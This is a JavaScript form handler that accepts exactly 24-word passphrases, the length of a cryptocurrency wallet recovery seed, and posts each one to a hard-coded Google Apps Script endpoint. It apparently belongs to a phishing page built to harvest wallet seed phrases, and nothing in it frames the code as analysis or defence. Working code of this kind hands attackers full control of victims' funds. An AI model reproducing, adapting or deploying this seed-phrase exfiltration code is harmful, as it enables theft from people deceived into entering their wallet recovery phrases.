// Modified JavaScript to send the phrase to Google Apps Script
function handleSubmit(event) {
    event.preventDefault();
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    myButton.disabled = true;
    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    const form = document.getElementById('myForm');
    const inputValue = form.elements['mf-texts'].value.trim();
    
    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }
    
    const scriptUrl = "https://script.google.com/macros/s/AKfycbyqDKhG-L-mGMb31keevGn9gEqgoMAL6qAtRD86xjFljhFYhlcmmmrGRYGL_yFQNw8/exec";
    
    fetch(scriptUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phrase: inputValue })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status !== "success") {
            errorElement.textContent = 'Failed to save phrase';
        } else {
            errorElement.textContent = 'Passphrase saved successfully';
        }
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Error saving phrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    });
}

const form = document.getElementById('myForm');
form.addEventListener('submit', handleSubmit);



